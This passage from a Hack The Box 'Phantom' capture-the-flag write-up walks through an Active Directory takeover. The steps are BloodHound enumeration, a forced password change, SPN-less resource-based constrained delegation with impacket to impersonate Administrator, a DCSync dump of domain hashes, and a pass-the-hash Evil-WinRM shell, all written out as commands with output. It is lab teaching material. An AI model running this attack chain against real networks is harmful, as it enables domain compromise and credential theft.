*Evil-WinRM* PS C:\users\svc_sspr\desktop> .\SharpHound.exe -c All --zipfilename sharphound_data
<SNIP>
2025-11-27T00:05:07.6051006-08:00|INFORMATION|SharpHound Enumeration Completed at 12:05 AM on 11/27/2025! Happy Graphing!

*Evil-WinRM* PS C:\users\svc_sspr\desktop> download 20251127000501_sharphound_data.zip
Info: Downloading C:\users\svc_sspr\desktop\20251127000501_sharphound_data.zip to 20251127000501_sharphound_data.zip
Info: Download successful!
```

Now let’s import this data into `bloodhound`, mark Ibryant and Svc_sspr as owned, and check what can we do:

![Figure 2](/assets/images/writeups/hack-the-box-phantom/hack-the-box-phantom-fig-3.png)

<figcaption class="blog-image-caption">Figure 2</figcaption>

Svc_ssrp has ForceChangePassword permission over three users.

### Resource-Based Constrained Delegation (RBCD)

### Initial Failure

One of them, Wsilva to be specific, has extremely interesting outbound object controls:

![Figure 3](/assets/images/writeups/hack-the-box-phantom/hack-the-box-phantom-fig-4.png)

<figcaption class="blog-image-caption">Figure 3</figcaption>

Wsilva has AddAllowedToAct permission over DC$, which allows Resource-Based Constrained Delegation (RBCD) attack through adding a new machine account to the domain.

First, let’s own Wsilva by changing its password using `net rpc`:

```bash
$ net rpc password "wsilva" 'Password11!' -U "phantom.vl"/"svc_sspr"%"gB6XT<REDACTED>" -S "10.129.234.63"
```

Let’s verify the change:

```bash
$ netexec smb phantom.vl -u wsilva -p 'Password11!'
SMB         10.129.234.63   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.129.234.63   445    DC               [+] phantom.vl\wsilva:Password11!
```

Nice.

For the attack to work, we must have the Machine Account Quota (MAQ) to be a non-zero value. Its default value is 10.

Let’s check its value in the current domain:

```bash
$ netexec ldap dc.phantom.vl -u wsilva -p 'Password11!' -M maq
LDAP        10.129.234.63   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:phantom.vl)
LDAP        10.129.234.63   389    DC               [+] phantom.vl\wsilva:Password11!
MAQ         10.129.234.63   389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.234.63   389    DC               MachineAccountQuota: 0
```

Well, that’s unfortunate.

### Workaround

[This article](https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users) by The Hacker Recipes shows how to perform RBCD without adding a new machine.

Basically, those are the steps:

1. Obtain write permissions over the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the DC machine account.
2. Get a TGT for Wsilva and note its Session Key value.
3. Replace Wsilva’s NTLM hash value with the Session Key value.
4. Trick the DC into believing that we got administrative privileges and get a service ticket on CIFS SPN.
5. Perform DCSync.

So let’s do those steps.

1. First let’s obtain the write permission over the msDS-AllowedToActOnBehalfOfOtherIdentity attribute, using `impacket-rbcd`:

```bash
$ impacket-rbcd -delegate-to 'DC$' -delegate-from wsilva -action write phantom/wsilva:'Password11!' -dc-ip 10.129.234.63
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Accounts allowed to act on behalf of other identity:
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
[*] wsilva can already impersonate users on DC$ via S4U2Proxy
[*] Not modifying the delegation rights.
[*] Accounts allowed to act on behalf of other identity:
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
```

1. Now let’s get a TGT for Wsilva using `impacket-getTGT` and Wsilva’s hash (using the password might break upcoming steps), then check its Session Key value using `impacket-describeTicket`:
    - Get the NTLM hash of the password using `pypykatz`:
    
```bash
    $ pypykatz crypto nt Password11!
    49a179202efa551d583da344669f6b15
```
    
    - Get a TGT:
    
```bash
    $ impacket-getTGT -hashes :49a179202efa551d583da344669f6b15 phantom.vl/wsilva
    Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
    
    [*] Saving ticket in wsilva.ccache
```
    
    - Export the ticket:
    
```bash
    $ export KRB5CCNAME=wsilva.ccache
```
    
    - Check the Session Key value:
    
```bash
    $ impacket-describeTicket wsilva.ccache
    Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
    
    [*] Number of credentials in cache: 1
    [*] Parsing credential[0]:
    [*] Ticket Session Key            : 095923072900d0a5110d92d9e5bf45c3
    [*] User Name                     : wsilva
    [*] User Realm                    : PHANTOM.VL
    [*] Service Name                  : krbtgt/PHANTOM.VL
    [*] Service Realm                 : PHANTOM.VL
    [*] Start Time                    : 27/11/2025 16:27:39 PM
    [*] End Time                      : 28/11/2025 02:27:39 AM
    [*] RenewTill                     : 28/11/2025 16:27:39 PM
    [*] Flags                         : (0x50e10000) forwardable, proxiable, renewable, initial, pre_authent, enc_pa_rep
    [*] KeyType                       : rc4_hmac
    [*] Base64(key)                   : CVkjBykA0KURDZLZ5b9Fww==
    [*] Decoding unencrypted data in credential[0]['ticket']:
    [*]   Service Name                : krbtgt/PHANTOM.VL
    [*]   Service Realm               : PHANTOM.VL
    [*]   Encryption type             : aes256_cts_hmac_sha1_96 (etype 18)
    [-] Could not find the correct encryption key! Ticket is encrypted with aes256_cts_hmac_sha1_96 (etype 18), but no keys/creds were supplied
```
    
2. Now let’s replace Wsilva’s NTLM hash value with the Session Key value using `impacket-changepassword`:

```bash
$ impacket-changepasswd -newhashes :095923072900d0a5110d92d9e5bf45c3 phantom.vl/wsilva:'Password11!'@phantom.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Changing the password of phantom.vl\wsilva
[*] Connecting to DCE/RPC as phantom.vl\wsilva
[*] Password was changed successfully.
[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
```

1. Let’s now get a Service Ticket and impersonate Administrator using `impacket-getST`:

```bash
$ impacket-getST -u2u -impersonate Administrator -spn cifs/dc.phantom.vl phantom.vl/wsilva -k -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
```

1. Finally, let’s export the ticket and perform DCSync to get the Administrator’s hash:

```bash
$ export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache

$ netexec smb phantom.vl --use-kcache --ntds --user Administrator
SMB         phantom.vl      445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         phantom.vl      445    DC               [+] phantom.vl\Administrator from ccache (Pwn3d!)
SMB         phantom.vl      445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         phantom.vl      445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd<REDACTED>:::
```

Very nice.

### RCE as Administrator

Let’s use `evil-winrm` to get a shell as Administrator and read `root.txt`:

```bash
$ evil-winrm -i phantom.vl -u Administrator -H aa2abd<REDACTED>
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          7/4/2024   7:22 AM           2308 Microsoft Edge.lnk
-ar---        11/26/2025   8:54 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
e33143<REDACTED>
```
